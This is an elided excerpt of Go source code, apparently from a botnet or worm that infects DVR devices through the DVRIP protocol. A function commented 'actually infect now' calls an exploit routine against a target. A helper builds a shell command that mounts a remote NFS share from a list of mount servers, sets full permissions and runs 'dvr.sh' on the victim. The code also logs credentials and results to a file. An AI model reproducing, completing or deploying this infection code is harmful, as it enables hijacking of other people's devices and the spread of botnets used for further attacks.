...
func dvripWebExploitFunction(target string) {
	...
	// actually infect now
	dvripExploitFunction(strings.Split(target, ":")[0] + ":" + port)
}
...
func createZip() ([]byte, error) {
	...
	var mountCommand = fmt.Sprintf("cd /var;  mkdir x; mount -o intr,nolock,tcp,exec %s:%s x; cd x; chmod 777 *; sh dvr.sh", MountServers[random.Intn(len(MountServers))], MountPoint)
...
func dvripExploitFunction(target string) {
  ...
  //fmt.Printf("username: %s, password: %s\r\n", user, pass)
	...
	if err != nil {
 	...
 	file, err := os.OpenFile("dvrip.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	if err != nil {
